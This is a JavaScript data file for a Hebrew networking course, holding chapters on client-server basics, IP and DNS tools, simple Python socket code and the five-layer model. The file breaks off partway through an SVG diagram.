// ===== TRACKS =====
// Each track is a self-contained learning path with its own chapters.
// Chapter IDs: Networking=1-99, Cyber=101-199, DevOps=201-299, Research=301-399

export const tracks = [
  {
    id: 'networking',
    title: 'רשתות מחשבים',
    subtitle: 'TCP/IP, DNS, HTTP ועוד 26 פרקים מרשתות בסיס עד BGP',
    icon: '🌐',
    color: '#0891b2',
    level: 'מתחיל–מתקדם',
    chapters: [

  {
    id: 1,
    title: "תחילת מסע - איך עובד האינטרנט?",
    pages: [
      {
        type: "explanation",
        title: "מה קורה כשאנו גולשים לאתר?",
        content: `
          <p>רובנו גלשנו ל־Facebook. אבל האם עצרנו לשאול – מה בעצם קורה מאחורי הקלעים כשגולשים? איך יתכן שאנו בבית, מקישים בדפדפן את הכתובת <code>www.facebook.com</code>, לוחצים Enter, ומקבלים את המידע?</p>
          <p>אתר Facebook זקוק למספר דברים כדי לתפקד: <strong>אחסון</strong> (מקום לדפי האתר), <strong>עיצוב</strong> (לוגו, מיקום אלמנטים), <strong>אימות</strong> (זיהוי משתמשים), ו־<strong>תקשורת</strong> – דרך שתאפשר לאדם לתקשר עם האתר מכל מקום בעולם.</p>
          <p>ספר זה מתמקד בתקשורת – בדרך העברת המידע בין רכיבים אלקטרוניים.</p>
        `
      },
      {
        type: "explanation",
        title: "WWW – World Wide Web",
        content: `
          <p>כשאנו אומרים "אינטרנט", אנו מתכוונים בדרך כלל ל־<strong>WWW</strong> (World Wide Web) – אוסף עמודי האינטרנט אליהם גולשים בדפדפן. משמעות המילה Web היא רשת – עמודי האינטרנט מקושרים זה לזה כמו קורי עכביש.</p>
          <p>כדי שהדפדפן יציג את העמוד, הוא צריך לשלוח <strong>הודעת בקשה (Request)</strong> אל השרת – "שלח לי את המידע הנדרש להצגת העמוד". השרת משיב ב־<strong>תגובה (Response)</strong> שמכילה את המידע הדרוש.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 400 140" class="content-diagram">
              <rect x="30" y="20" width="90" height="60" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="75" y="50" text-anchor="middle" font-size="12" fill="var(--text)">לקוח</text>
              <text x="75" y="65" text-anchor="middle" font-size="10" fill="var(--text-muted)">(דפדפן)</text>
              <path d="M 125 50 L 175 50" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrow)"/>
              <text x="150" y="40" text-anchor="middle" font-size="9" fill="var(--accent-green)">בקשה</text>
              <path d="M 275 50 L 225 50" stroke="var(--accent-gold)" stroke-width="2" marker-end="url(#arrow2)"/>
              <text x="250" y="40" text-anchor="middle" font-size="9" fill="var(--accent-gold)">תגובה</text>
              <rect x="280" y="20" width="90" height="60" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="325" y="50" text-anchor="middle" font-size="12" fill="var(--text)">שרת</text>
              <text x="325" y="65" text-anchor="middle" font-size="10" fill="var(--text-muted)">(אתר)</text>
              <defs><marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-green)"/></marker>
              <marker id="arrow2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-gold)"/></marker></defs>
            </svg>
            <p class="diagram-caption">תרשים: תקשורת לקוח-שרת</p>
          </div>
          <p>האתר מקבל בקשות ושולח תגובות – הוא מספק שירות. לפיכך: האתר הוא <strong>שרת (Server)</strong>, והדפדפן הוא <strong>לקוח (Client)</strong>.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: מה השרת שולח ללקוח",
        content: `
          <p>כשבחורה בוחרת "View page source" (הצג מקור) באתר, היא רואה את הקוד שהשרת שלח. הנה דוגמה לפנים הדף – זה מה שהשרת מחזיר:</p>
          <div class="code-preview">
            <pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang="he"&gt;
&lt;head&gt;
  &lt;title&gt;עמוד ראשי - Ynet&lt;/title&gt;
  &lt;meta charset="UTF-8"&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;כותרת ראשית של העמוד&lt;/h1&gt;
  &lt;p&gt;טקסט שמציגים למשתמש...&lt;/p&gt;
  &lt;img src="/images/photo.jpg" alt="תמונה"&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
          </div>
          <p class="demo-note">📋 זה מה שמופיע בחלון "מקור הדף" – טקסט שמתאר איפה כל אלמנט מונח, אילו תמונות יש, ומה הכותרת. הדפדפן קורא את הקוד הזה ובונה ממנו את העמוד שאת רואה.</p>
        `
      },
      {
        type: "explanation",
        title: "כתובות IP",
        content: `
          <p>כדי לשלוח ולקבל הודעות באינטרנט, צריך לדעת לאן לשלוח. כמו במכתב – מציינים על המעטפה כתובת יעד וכתובת מקור. באינטרנט נקראות כתובות אלו <strong>כתובות IP</strong>.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 70" class="content-diagram">
              <rect x="10" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="38" text-anchor="middle" font-size="11" fill="var(--text)">בית 1</text>
              <text x="45" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <line x1="85" y1="35" x2="95" y2="35" stroke="var(--text-muted)"/>
              <rect x="100" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="135" y="38" text-anchor="middle" font-size="11" fill="var(--text)">בית 2</text>
              <text x="135" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <line x1="175" y1="35" x2="185" y2="35" stroke="var(--text-muted)"/>
              <rect x="190" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="225" y="38" text-anchor="middle" font-size="11" fill="var(--text)">בית 3</text>
              <text x="225" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <line x1="265" y1="35" x2="275" y2="35" stroke="var(--text-muted)"/>
              <rect x="280" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="315" y="38" text-anchor="middle" font-size="11" fill="var(--text)">בית 4</text>
              <text x="315" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <text x="170" y="65" text-anchor="middle" font-size="12" fill="var(--accent)">192 . 168 . 1 . 105</text>
            </svg>
            <p class="diagram-caption">מבנה כתובת IPv4 – ארבעה בתים מופרדים בנקודה</p>
          </div>
          <p>כתובות IP מורכבות מארבעה בתים (bytes), כל בית בטווח 0–255, מופרדים בנקודה. לדוגמה: <code>1.2.3.4</code>, <code>192.168.1.1</code>, <code>31.13.72.65</code> (כתובת Facebook).</p>
          <p>הודעת הבקשה מהדפדפן מכילה בכתובת המקור את כתובת ה־IP של המחשב, ובכתובת היעד את כתובת ה־IP של האתר. בהודעת התגובה – ההפך.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: פלט של פקודת ping",
        content: `
          <p>כשרצים <code>ping www.facebook.com</code>, זה הפלט שמופיע – הנה מה שאת רואה:</p>
          <div class="code-preview">
            <pre><code>C:\&gt; ping www.facebook.com

Pinging facebook.com [31.13.72.65] with 32 bytes of data:
Reply from 31.13.72.65: bytes=32 time=45ms TTL=56
Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
          </div>
          <p class="demo-note">📋 בשורה <code>Pinging facebook.com [31.13.72.65]</code> – המספר בסוגריים הוא כתובת ה־IP של Facebook. ping שולח "בקשת הד" ומקבל תשובה, ומראה גם זמן התגובה (time) במילישניות.</p>
        `
      },
      {
        type: "explanation",
        title: "ענן האינטרנט",
        content: `
          <p>המחשב שלנו לא מחובר ישירות לאתר Facebook. הוא מחובר לרכיב שמוצא לרכיבים אחרים – רשת של רכיבים שמעבירים את ההודעה מהמחשב ועד לשרת היעד. כל חץ בין רכיבים מייצג תקשורת בשכבת הקו.</p>
        `
      },
      {
        type: "explanation",
        title: "traceroute – מסלול ההודעה",
        content: `
          <p>כלי <strong>traceroute</strong> מציג את הדרך שעוברת הודעה מהמחשב שלנו אל יעד (למשל Facebook). כל שורה בפלט = רכיב אחד (נתב/שרת) שהחבילה עברה דרכו – "hop" אחד.</p>
          <p>כלי ויזואלי: Visual Traceroute (yougetsignal.com/tools/visual-tracert) מציג את המסלול על מפת העולם.</p>
        `
      },
      {
        type: "explanation",
        title: "DNS – מתרגם שם ל-IP",
        content: `
          <p>יש צורך בתרגום בין שמות דומיין (כמו <code>www.facebook.com</code>) לכתובות IP. מערכת <strong>DNS</strong> (Domain Name System) מבצעת זאת. פקודת <code>nslookup www.facebook.com</code> שולחת שאילתת DNS ומציגה את כתובת ה־IP.</p>
        `
      },
      {
        type: "simulation",
        title: "הדמיית DNS – תרגום דומיין ל־IP",
        simId: "dnsLookup",
        content: `<p>הדמי את תהליך ה־DNS: הכניסי דומיין (למשל google.com) ולחצי "חפשי IP" – המדריך מדגים את הזרימה.</p>`
      },
      {
        type: "simulation",
        title: "הדמיית מסלול חבילה ברשת",
        simId: "packetFlow",
        content: `<p>לחצי "הרץ מסלול" כדי לראות איך חבילה עוברת ממחשב דרך Switch ונתבים עד לשרת – כל צעד בנפרד.</p>`
      },
      {
        type: "explanation",
        title: "GeoIP – מיקום גיאוגרפי",
        content: `
          <p>ישנם מאגרי נתונים הכוללים מידע על המיקום הגיאוגרפי של כתובות IP. בהינתן כתובת IP, ניתן לדעת באיזו מדינה ועיר היא נמצאת.</p>
          <p>המיפוי אינו רשמי ולא מדויק, אך נותן מענה נכון ברוב המקרים. דוגמה: <a href="http://www.geoiptool.com" target="_blank">geoiptool.com</a></p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – פרק 1",
        intro: "<p>כדי להעמיק – שאלות מפתיעות ותשובות יצירתיות:</p>",
        blocks: [
          {
            title: "למה דווקא 255? למה 65535 פורטים?",
            icon: "🔢",
            content: `
              <p><strong>255</strong> = 2^8 − 1. בית אחד = 8 ביטים = 256 ערכים (0 עד 255). IPv4 = 4 בתים. <strong>65535</strong> = 2^16 − 1. פורט = 16 ביטים. המחשבה מחוץ לקופסא: הרשת בנויה על כוחו של הבינארי – כל ביט מכפיל את האפשרויות.</p>
            `
          },
          {
            title: "IP over Avian Carriers – אינטרנט עם יונים",
            icon: "🕊️",
            content: `
              <p><strong>RFC 1149</strong> הוא תקן אמיתי (משנת 1990!) – "IP over Avian Carriers" – העברת חבילות IP באמצעות יונים. באפריל 2001 בוצע ניסוי בנורווגיה (Bergen Linux User Group): שוגרו 9 יונות. 4 חבילות הגיעו, 5 אבדו (packet loss ~56%). Latency ממוצע: 3000 שניות (50 דקות!). הרעיון: פרוטוקול הוא רק "שפה" – העברה פיזית יכולה להיות כל דבר. אפילו יונים.</p>
            `
          },
          {
            title: "מה קורה כשחבילה הולכת לאיבוד?",
            icon: "❓",
            content: `
              <p>ב־<strong>TCP</strong> – השלוח לא מקבל ACK, מחכה timeout, ושולח שוב. ב־<strong>UDP</strong> – אף אחד לא שם לב. היישום אולי יבחין (סרטון "קפיצה", שיחה נקטעת) – או לא. חשיבה מחוץ לקופסא: הרשת לא "יודעת" מה חשוב – רק הפרוטוקולים והיישומים מחליטים.</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 1",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>מודל לקוח-שרת: הדפדפן שולח בקשה, השרת מחזיר תגובה</li>
              <li>כתובות IP מזהה מחשבים (4 בתים, 0-255)</li>
              <li>ping – בדיקת חיבור, מציאת IP. traceroute – מסלול החבילות</li>
              <li>DNS מתרגם שם דומיין (www.facebook.com) ל־IP. nslookup – שאילתת DNS</li>
              <li>GeoIP – מיפוי IP למיקום גיאוגרפי (לא מדויק)</li>
            </ul>
          </div>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: פלט של nslookup",
        content: `
          <p>כשרצים <code>nslookup www.google.com</code>, זה סוג הפלט:</p>
          <div class="code-preview">
            <pre><code>C:\&gt; nslookup www.google.com

Non-authoritative answer:
Name:    www.google.com
Addresses:  142.250.185.46
            2a00:1450:4010:c08::8b</code></pre>
          </div>
          <p class="demo-note">📋 הכתובת הראשונה היא IPv4, השנייה IPv6. "Non-authoritative" – תשובה משרת מטמון, לא משרת ה-DNS הראשי של הדומיין.</p>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 1",
        questions: [
          {
            q: "מה ההבדל בין לקוח לשרת?",
            a: "הלקוח (Client) שולח בקשות – למשל הדפדפן שמבקש דף אינטרנט. השרת (Server) מקבל את הבקשות ומחזיר תגובות – למשל אתר Facebook ששולח את תוכן הדף."
          },
          {
            q: "איך נראה כתובת IP ומה המבנה שלה?",
            a: "כתובת IP מורכבת מארבעה מספרים (בתים) מופרדים בנקודות, כל מספר בטווח 0-255. דוגמאות: 192.168.1.1, 31.13.72.65."
          },
          {
            q: "מה עושה traceroute ולמה הוא שימושי?",
            a: "traceroute מציג את מסלול החבילות מהמחשב ליעד – כל נתב ושרת בדרך. שימושי לאבחון עיכובים, זיהוי מקום תקלה, והבנת איך הרשת בנויה."
          },
          {
            q: "איך DNS עובד? למה הדפדפן לא יכול פשוט להשתמש בשם?",
            a: "הרשת עובדת עם כתובות IP – מספרים. DNS הוא פנקס טלפונים שמתרגם שמות קריאים (www.google.com) למספרים. הדפדפן שולח שאילתה לשרת DNS, שמחזיר את ה-IP."
          }
        ]
      }
    ]
  },
  {
    id: 2,
    title: "תכנות ב-Sockets",
    pages: [
      {
        type: "explanation",
        title: "מהו Socket?",
        content: `
          <p><strong>Socket</strong> הוא ממשק שמאפשר לתקשר בין שני מחשבים. כמתוכנתים, מאוד נוח להשתמש ב־Sockets – מעבר לכתובת המחשב המרוחק, הפורט שעליו הוא מאזין, והתחברות – לא צריך לעשות עוד הרבה.</p>
          <p>ה־Socket מפשט את כל תהליך התקשורת שקורה בפועל ברשת. בפרק זה נלמד ליצור שרת ולקוח בפייתון באמצעות Sockets.</p>
        `
      },
      {
        type: "explanation",
        title: "מודל שרת-לקוח ב-Sockets",
        content: `
          <p>ניתן לדמות את התקשורת לשליחת מכתב בין שתי משפחות בבניין רב קומות: מזהה הרכיב (השרת) הוא מזהה הבניין – כתובת ה־IP. מזהה התוכנה הוא מזהה הדירה – הפורט (0–65535).</p>
          <p>השרת מאזין על פורט מסוים ומחכה לחיבורים. הלקוח מתחבר לכתובת ולפורט, ושולח/מקבל הודעות.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: קוד לקוח בפייתון",
        content: `
          <p>זה הקוד המלא ללקוח שמתחבר, שולח שם ומקבל תשובה:</p>
          <div class="code-preview">
            <pre><code>import socket

my_socket = socket.socket()
my_socket.connect(('1.2.3.4', 8820))
my_socket.send(b'Omer')          # bytes, לא string!
data = my_socket.recv(1024)
print('The server sent:', data.decode())
my_socket.close()</code></pre>
          </div>
          <p class="demo-note">📋 socket() יוצר אובייקט. connect() מתחבר ל־IP:Port. send() שולח bytes (b'...'), recv() מקבל (blocking – עוצר עד לקבלת מידע). decode() ממיר bytes לטקסט. close() משחרר משאבים. 127.0.0.1 = התחברות למחשב עצמו (loopback).</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: קוד שרת בפייתון",
        content: `
          <p>זה המבנה הבסיסי של שרת:</p>
          <div class="code-preview">
            <pre><code>import socket

server_socket = socket.socket()
server_socket.bind(('0.0.0.0', 8820))
server_socket.listen(1)
(client_socket, client_address) = server_socket.accept()
data = client_socket.recv(1024).decode()   # bytes → string
client_socket.send(('Hello ' + data).encode())  # string → bytes
client_socket.close()
server_socket.close()</code></pre>
          </div>
          <p class="demo-note">📋 bind() מקשיר את השרת ל־IP ולפורט. listen() מתחיל להאזין. accept() מחכה לחיבור (blocking) ומחזיר socket של הלקוח וכתובתו. recv() מחזיר bytes — decode() ממיר לטקסט. send() דורש bytes — encode() ממיר. recv() מחזיר b'' ריק אם הלקוח התנתק.</p>
        `
      },
      {
        type: "explanation",
        title: "שרת הדים ושרת פקודות",
        content: `
          <p><strong>שרת הדים (Echo)</strong> – מחזיר ללקוח בדיוק מה שקיבל. שרת שמקבל שם (למשל "Omer") ומחזיר "Hello Omer". <strong>שרת פקודות</strong> – מקבל פקודה (למשל "SCREENSHOT") ומבצע פעולה בהתאם. השרת מטפל בלקוח אחד – accept עוצר until חיבור חדש, recv עוצר until מידע.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 2",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>Socket = ממשק לתקשורת בין מחשבים. bind, listen, accept, recv, send</li>
              <li>לקוח: connect, send, recv (blocking). שרת: bind, listen, accept</li>
              <li>127.0.0.1 = loopback. שרת הדים, שרת פקודות</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "127.0.0.1 ו־0.0.0.0",
        content: `
          <p><strong>127.0.0.1</strong> (loopback) – כתובת שמפנה למחשב עצמו. להתחברות לשרת שרץ locally. <strong>0.0.0.0</strong> ב־bind – "האזן על כל הממשקים" – השרת מקבל חיבורים מכל כתובת IP של המחשב (כולל 127.0.0.1 וממשק הרשת).</p>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 2",
        questions: [
          {
            q: "מה תפקיד הפורט בהקשר של Socket?",
            a: "הפורט מזהה את התוכנה הספציפית על השרת. שרת אחד יכול להריץ כמה שירותים – אימייל, HTTP וכו'. כל שירות מאזין על פורט אחר, כך שהשרת יודע להפנות את הבקשה לתוכנה הנכונה."
          },
          {
            q: "מה ההבדל בין bind ל־connect?",
            a: "bind – קושר את ה-Socket לכתובת ופורט (לשרת – 'אני מאזין כאן'). connect – מתחבר לכתובת ופורט מרוחקים (ללקוח – 'אני מתחבר אליך')."
          },
          {
            q: "למה recv ו-accept נקראים blocking?",
            a: "הם עוצרים את הביצוע עד שמשהו קורה – accept עד שחיבור חדש מגיע, recv עד שמידע מגיע. אם לא יגיע כלום – התוכנה תישאר תקועה (עד timeout אם הוגדר)."
          }
        ]
      }
    ]
  },
  {
    id: 3,
    title: "Wireshark ומודל חמש השכבות",
    pages: [
      {
        type: "explanation",
        title: "מה קורה כשאנחנו מתקשרים?",
        content: `
          <p>ב־Sockets היה לנו נוח – לא ראינו מה באמת עובר ברשת. <strong>Wireshark</strong> הוא כלי שמאפשר לחקור את המידע שיוצא ונכנס בכרטיס הרשת – לראות בדיוק מה עובר כשמדברים עם מחשב מרוחק.</p>
          <p>בפרק זה נציג גם את <strong>מודל חמש השכבות</strong> – מודל לוגי שמחלק את פעולות מערכת התקשורת לחמישה חלקים.</p>
        `
      },
      {
        type: "explanation",
        title: "למה צריך מודל שכבות?",
        content: `
          <p>העברת מידע בין רכיבי האינטרנט – מחשבים, שרתים, נתבים – היא משימה מורכבת. איך לארגן את כל זה?</p>
          <p>ארגון התקינה הבינלאומי (ISO) יצר את מודל שבע השכבות (OSI). בספר משתמשים ב־<strong>מודל חמש השכבות</strong> – דומה ל־OSI אך מוותר על שתי שכבות שהתגלו כמיותרות. המודל מנחה כיצד צריכה להיראות תקשורת, ללא תלות ביצרן החומרה.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: אנלוגיה – טיסה בשדה תעופה",
        content: `
          <div class="demo-flow">
            <p>דוגמה להבנת שכבות – אדם שעובר משדה תעופה במדינת המקור למדינת היעד:</p>
            <ol class="demo-steps">
              <li><strong>שכבת מזוודות</strong> – הפקדה/קבלה של מטען</li>
              <li><strong>שכבת דרכונים</strong> – החתמה יוצאת/נכנסת</li>
              <li><strong>שכבת שערים</strong> – עלייה/ירידה מהמטוס</li>
              <li><strong>שכבת טיסה</strong> – העברה פיזית בין המדינות</li>
            </ol>
            <p>כל שכבה מספקת שירות לשכבות שמעליה, ולא תלויה במימוש השכבות מתחתיה. אם יחליפו דרכונים אלקטרוניים – שאר התחנות לא מושפעות.</p>
          </div>
        `
      },
      {
        type: "explanation",
        title: "מודל חמש השכבות – סקירה",
        content: `
          <div class="diagram-container">
            <svg viewBox="0 0 280 200" class="content-diagram layers-diagram">
              <rect x="10" y="10" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="28" font-size="11" fill="var(--text)">5. אפליקציה</text><text x="200" y="28" font-size="9" fill="var(--text-muted)">HTTP, DNS</text>
              <rect x="10" y="45" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="63" font-size="11" fill="var(--text)">4. תעבורה</text><text x="200" y="63" font-size="9" fill="var(--text-muted)">TCP, UDP</text>
              <rect x="10" y="80" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="98" font-size="11" fill="var(--text)">3. רשת</text><text x="200" y="98" font-size="9" fill="var(--text-muted)">IP</text>
              <rect x="10" y="115" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="133" font-size="11" fill="var(--text)">2. קו</text><text x="200" y="133" font-size="9" fill="var(--text-muted)">Ethernet</text>
              <rect x="10" y="150" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="168" font-size="11" fill="var(--text)">1. פיזית</text><text x="200" y="168" font-size="9" fill="var(--text-muted)">כבלים, אותות</text>
              <path d="M 140 10 L 140 180" stroke="var(--accent)" stroke-dasharray="4,4" opacity="0.5"/>
            </svg>
            <p class="diagram-caption">מודל חמש השכבות</p>
          </div>
          <p>השכבות (מלמעלה למטה):</p>
          <ul>
            <li><strong>5. אפליקציה</strong> – פרוטוקולי היישומים (HTTP, DNS וכו')</li>
            <li><strong>4. תעבורה</strong> – TCP, UDP – העברת מידע בין תהליכים</li>
            <li><strong>3. רשת</strong> – IP – ניתוב חבילות בין רכיבי הרשת</li>
            <li><strong>2. קו</strong> – Ethernet וכו' – העברה מקומית בין צומתים</li>
            <li><strong>1. פיזית</strong> – אותות, כבלים, אותות אלחוטיים</li>
          </ul>
          <p>כל שכבה מדברת רק עם השכבות הסמוכות אליה. המידע עובר מלמעלה למטה (בשליחה) ומלמטה למעלה (בקבלה).</p>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול – הגדרה",
        content: `
          <p><strong>פרוטוקול</strong> (תקן) = סט חוקים שמונה כיצד צריכה להיראות התקשורת. כמו שפה – קובעת כללי תחביר ואוצר מילים. בלי פרוטוקולים כל רכיב ידבר "שפה" משלו – מגדל בבל. HTTP קובע איך הדפדפן ידבר עם השרת.</p>
        `
      },
      {
        type: "explanation",
        title: "Encapsulation ו-Decapsulation",
        content: `
          <p>בשליחה: כל שכבה מקבלת מהשכבה שמעליה את הפקטה, מוסיפה <strong>Header</strong> (תחילית) בתחילתה, ומעבירה לשכבה שמתחת. זה <strong>Encapsulation</strong> (כימוס).</p>
          <p>בקבלה: השכבה התחתונה מקבלת את הפקטה, מקלפת את ה־Header שלה, מעבירה את ה־Data לשכבה שמעל – <strong>Decapsulation</strong>. המידע שכל שכבה מוסיפה = Header – מכיל כתובת, בקרת שגיאות וכו'.</p>
        `
      },
      {
        type: "simulation",
        title: "הדמיית Encapsulation / Decapsulation",
        simId: "encapsulation",
        content: `<p>לחצי על "Encapsulation" כדי לראות איך כל שכבה מוסיפה Header בשליחה. לחצי "Decapsulation" לראות איך מקלפים בקבלה.</p>`
      },
      {
        type: "explanation",
        title: "מבנה הפקטה – כל שכבה מוסיפה Header",
        content: `
          <p>הפקטה בנויה משכבות: Ethernet Header + IP Header + TCP Header + Data. ה־Data של שכבה n = הפקטה המלאה של שכבה n+1 (כולל ה־Header שלה). בשכבת הקו יש גם Trailer בסוף המסגרת. Wireshark מציג את המבנה – מסננים כמו "http", "dns" לסנן לפי פרוטוקול.</p>
        `
      },
      {
        type: "explanation",
        title: "פירוט כל שכבה – שירותים",
        content: `
          <div class="layers-detail">

            <div class="layer-card lc-5">
              <div class="lc-info">
                <div class="lc-num">5</div>
                <div class="lc-text">
                  <strong>שכבת אפליקציה</strong>
                  <span class="lc-proto">HTTP · HTTPS · DNS · FTP · SMTP</span>
                  <p>הממשק הישיר עם המשתמש. האפליקציה בונה בקשה בשפה מובנת (HTTP GET), השרת מחזיר תגובה.</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg viewBox="0 0 200 64" class="lc-svg">
                  <rect x="4" y="14" width="54" height="36" rx="5" fill="rgba(8,145,178,0.1)" stroke="#0891b2" stroke-width="1.2"/>
                  <text x="31" y="30" text-anchor="middle" font-size="7.5" fill="#0e7490" font-weight="bold">🌐 Browser</text>
                  <text x="31" y="43" text-anchor="middle" font-size="6.5" fill="#0891b2">HTTP Client</text>
                  <path d="M 60 27 L 128 27" stroke="#d97706" stroke-width="1.3" marker-end="url(#arr-a)"/>
                  <text x="94" y="22" text-anchor="middle" font-size="6.5" fill="#d97706">GET /index.html</text>
                  <path d="M 128 39 L 60 39" stroke="#059669" stroke-width="1.3" marker-end="url(#arr-b)"/>
                  <text x="94" y="52" text-anchor="middle" font-size="6.5" fill="#059669">200 OK + HTML</text>
                  <rect x="130" y="14" width="62" height="36" rx="5" fill="rgba(5,150,105,0.1)" stroke="#059669" stroke-width="1.2"/>
                  <text x="161" y="30" text-anchor="middle" font-size="7.5" fill="#065f46" font-weight="bold">🖥 Server</text>
                  <text x="161" y="43" text-anchor="middle" font-size="6.5" fill="#059669">nginx / Apache</text>
                  <defs>
                    <marker id="arr-a" markerWidth="5" markerHeight="5" refX="5" refY="2.5" orient="auto"><path d="M0,0 L5,2.5 L0,5z" fill="#d97706"/></marker>
                    <marker id="arr-b" markerWidth="5" markerHeight="5" refX="5" refY="2.5" orient="auto"><path d="M0,0 L5,2.5 L0,5z" fill="#059669"/></marker>
                  </defs>
                </svg>
              </div>
            </div>

            <div class="layer-card lc-4">
              <div class="lc-info">
                <div class="lc-num">4</div>
                <div class="lc-text">
                  <strong>שכבת תעבורה</strong>
                  <span class="lc-proto">TCP · UDP</span>
                  <p>אחראית על העברה אמינה בין <em>תהליכים</em> (פורטים). TCP מבטיח סדר ואישור קבלה. UDP מהיר ללא אישור.</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg viewBox="0 0 200 64" class="lc-svg">
                  <rect x="4" y="10" width="58" height="44" rx="5" fill="rgba(124,58,237,0.08)" stroke="#7c3aed" stroke-width="1.2"/>
                  <text x="33" y="26" text-anchor="middle" font-size="7" fill="#6d28d9" font-weight="bold">App Process</text>
                  <text x="33" y="38" text-anchor="middle" font-size="9" fill="#7c3aed" font-weight="bold">:52341</text>
                  <text x="33" y="49" text-anchor="middle" font-size="6" fill="#7c3aed">src port</text>
                  <path d="M 65 32 L 130 32" stroke="#7c3aed" stroke-width="1.5" marker-end="url(#arr-t)"/>
                  <rect x="73" y="22" width="54" height="18" rx="3" fill="rgba(124,58,237,0.08)" stroke="#7c3aed" stroke-width="0.8"/>
                  <text x="100" y="34" text-anchor="middle" font-size="6.5" fill="#6d28d9">TCP Segment</text>
                  <text x="100" y="53" text-anchor="middle" font-size="5.8" fill="rgba(15,23,42,0.45)">Seq# · Ack# · Flags</text>
                  <rect x="133" y="10" width="60" height="44" rx="5" fill="rgba(124,58,237,0.08)" stroke="#7c3aed" stroke-width="1.2"/>
                  <text x="163" y="26" text-anchor="middle" font-size="7" fill="#6d28d9" font-weight="bold">Web Server</text>
                  <text x="163" y="38" text-anchor="middle" font-size="9" fill="#7c3aed" font-weight="bold">:443</text>
                  <text x="163" y="49" text-anchor="middle" font-size="6" fill="#7c3aed">dst port</text>
                  <defs><marker id="arr-t" markerWidth="5" markerHeight="5" refX="5" refY="2.5" orient="auto"><path d="M0,0 L5,2.5 L0,5z" fill="#7c3aed"/></marker></defs>
                </svg>
              </div>
            </div>

            <div class="layer-card lc-3">
              <div class="lc-info">
                <div class="lc-num">3</div>
                <div class="lc-text">
                  <strong>שכבת רשת</strong>
                  <span class="lc-proto">IP · ICMP · OSPF · BGP</span>
                  <p>ניתוב חבילות בין רשתות שונות ברחבי האינטרנט. הנתב (Router) מחליט את המסלול לפי כתובת IP.</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg viewBox="0 0 200 64" class="lc-svg">
                  <rect x="4" y="18" width="44" height="28" rx="4" fill="rgba(8,145,178,0.1)" stroke="#0891b2" stroke-width="1.1"/>
                  <text x="26" y="31" text-anchor="middle" font-size="6.5" fill="#0e7490" font-weight="bold">PC</text>
                  <text x="26" y="40" text-anchor="middle" font-size="5.8" fill="#0891b2">192.168.1.5</text>
                  <path d="M 50 32 L 80 32" stroke="#0e7490" stroke-width="1.2" marker-end="url(#arr-n)"/>
                  <circle cx="93" cy="32" r="13" fill="rgba(217,119,6,0.12)" stroke="#d97706" stroke-width="1.2"/>
                  <text x="93" y="29" text-anchor="middle" font-size="8" fill="#b45309">⇄</text>
                  <text x="93" y="39" text-anchor="middle" font-size="6" fill="#b45309">Router</text>
                  <path d="M 108 32 L 138 32" stroke="#0e7490" stroke-width="1.2" marker-end="url(#arr-n)"/>
                  <circle cx="151" cy="32" r="13" fill="rgba(217,119,6,0.12)" stroke="#d97706" stroke-width="1.2"/>
                  <text x="151" y="29" text-anchor="middle" font-size="8" fill="#b45309">⇄</text>
                  <text x="151" y="39" text-anchor="middle" font-size="6" fill="#b45309">Router</text>
                  <path d="M 166 32 L 185 32" stroke="#0e7490" stroke-width="1.2" marker-end="url(#arr-n)"/>
                  <text x="192" y="35" text-anchor="middle" font-size="10" fill="#0e7490">🌐</text>
